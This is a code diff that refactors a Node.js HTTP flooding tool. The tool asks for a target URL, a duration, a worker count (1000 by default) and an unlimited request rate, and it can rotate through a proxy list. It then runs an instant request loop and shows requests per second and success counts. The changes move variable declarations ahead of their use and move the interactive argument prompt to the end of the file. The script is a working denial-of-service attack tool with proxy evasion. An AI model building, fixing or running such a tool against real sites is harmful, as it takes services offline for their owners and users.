@@ -17,41 +17,22 @@ const c = {
     cyan: '\x1b[96m', bold: '\x1b[1m', reset: '\x1b[0m', clear: '\x1b[2J\x1b[H'
 };
 
-// ==================== CONFIG ====================
+// ==================== GLOBAL VARIABLES (defined BEFORE use) ====================
 let target = null;
 let duration = 60;
 let workers = 1000;
 let rate = 0;
 let proxyFile = null;
-
-// Parse args or interactive
-(async () => {
-    if (process.argv[2]) {
-        target = process.argv[2];
-        duration = parseInt(process.argv[3]) || 60;
-        workers = parseInt(process.argv[4]) || 1000;
-        rate = parseInt(process.argv[5]) || 0;
-        proxyFile = process.argv[6] || null;
-        start();
-    } else {
-        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
-        target = await new Promise(resolve => rl.question(`${c.cyan}🌐 Target URL: ${c.reset}`, resolve));
-        duration = parseInt(await new Promise(resolve => rl.question(`${c.cyan}⏱️  Duration (seconds): ${c.reset}`, resolve))) || 60;
-        workers = parseInt(await new Promise(resolve => rl.question(`${c.cyan}👥 Workers: ${c.reset}`, resolve))) || 1000;
-        rate = parseInt(await new Promise(resolve => rl.question(`${c.cyan}🚦 Rate/worker (0=unlimited): ${c.reset}`, resolve))) || 0;
-        const useProxy = await new Promise(resolve => rl.question(`${c.cyan}🔄 Use proxy file? (y/n): ${c.reset}`, resolve));
-        if (useProxy.toLowerCase() === 'y') {
-            proxyFile = await new Promise(resolve => rl.question(`${c.cyan}📁 Proxy file path: ${c.reset}`, resolve)) || 'proxy.txt';
-        }
-        rl.close();
-        start();
-    }
-})();
-
-// ==================== PROXIES ====================
 let proxies = [];
 let proxyIndex = 0;
+let stop = false;
 
+let stats = {
+    total: 0, success: 0, failed: 0,
+    startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0
+};
+
+// ==================== PROXY LOADER ====================
 function loadProxies() {
     if (!proxyFile) return;
     try {
@@ -106,25 +87,7 @@ function sendRequest(url, callback) {
     req.end();
 }
 
-// ==================== STATISTICS ====================
-let stats = {
-    total: 0, success: 0, failed: 0,
-    startTime: null, lastSec: 0, lastSecCount: 0, peakRps: 0
-};
-let stop = false;
-
-function displayStats() {
-    const elapsed = (Date.now() - stats.startTime) / 1000;
-    const rps = stats.total / Math.max(elapsed, 0.1);
-    const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
-    process.stdout.write(`\r${c.cyan}RPS: ${c.bold}${rps.toFixed(1)}${c.reset} | ` +
-        `${c.green}✓ ${stats.success.toLocaleString()}${c.reset} | ` +
-        `${c.red}✗ ${stats.failed.toLocaleString()}${c.reset} | ` +
-        `${c.yellow}${successRate.toFixed(1)}%${c.reset} | ` +
-        `${c.dim}${elapsed.toFixed(0)}s${c.reset}`);
-}
-
-// ==================== WORKER (NO DELAY – INSTANT LOOP) ====================
+// ==================== WORKER (INSTANT LOOP) ====================
 function worker() {
     if (stop) return;
     // Rate limiting (optional)
@@ -168,8 +131,20 @@ function worker() {
     });
 }
 
+// ==================== STATS DISPLAY ====================
+function displayStats() {
+    const elapsed = (Date.now() - stats.startTime) / 1000;
+    const rps = stats.total / Math.max(elapsed, 0.1);
+    const successRate = stats.total ? (stats.success / stats.total * 100) : 0;
+    process.stdout.write(`\r${c.cyan}RPS: ${c.bold}${rps.toFixed(1)}${c.reset} | ` +
+        `${c.green}✓ ${stats.success.toLocaleString()}${c.reset} | ` +
+        `${c.red}✗ ${stats.failed.toLocaleString()}${c.reset} | ` +
+        `${c.yellow}${successRate.toFixed(1)}%${c.reset} | ` +
+        `${c.dim}${elapsed.toFixed(0)}s${c.reset}`);
+}
+
 // ==================== MAIN ====================
-function start() {
+async function start() {
     if (!target.startsWith('http')) target = 'https://' + target;
     console.log(c.clear);
     console.log(`${c.red}${c.bold}
@@ -221,3 +196,27 @@ function start() {
         stop = true;
     }, duration * 1000);
 }
+
+// ==================== INTERACTIVE INPUT ====================
+(async () => {
+    if (process.argv[2]) {
+        target = process.argv[2];
+        duration = parseInt(process.argv[3]) || 60;
+        workers = parseInt(process.argv[4]) || 1000;
+        rate = parseInt(process.argv[5]) || 0;
+        proxyFile = process.argv[6] || null;
+        start();
+    } else {
+        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+        target = await new Promise(resolve => rl.question(`${c.cyan}🌐 Target URL: ${c.reset}`, resolve));
+        duration = parseInt(await new Promise(resolve => rl.question(`${c.cyan}⏱️  Duration (seconds): ${c.reset}`, resolve))) || 60;
+        workers = parseInt(await new Promise(resolve => rl.question(`${c.cyan}👥 Workers: ${c.reset}`, resolve))) || 1000;
+        rate = parseInt(await new Promise(resolve => rl.question(`${c.cyan}🚦 Rate/worker (0=unlimited): ${c.reset}`, resolve))) || 0;
+        const useProxy = await new Promise(resolve => rl.question(`${c.cyan}🔄 Use proxy file? (y/n): ${c.reset}`, resolve));
+        if (useProxy.toLowerCase() === 'y') {
+            proxyFile = await new Promise(resolve => rl.question(`${c.cyan}📁 Proxy file path: ${c.reset}`, resolve)) || 'proxy.txt';
+        }
+        rl.close();
+        start();
+    }
+})();
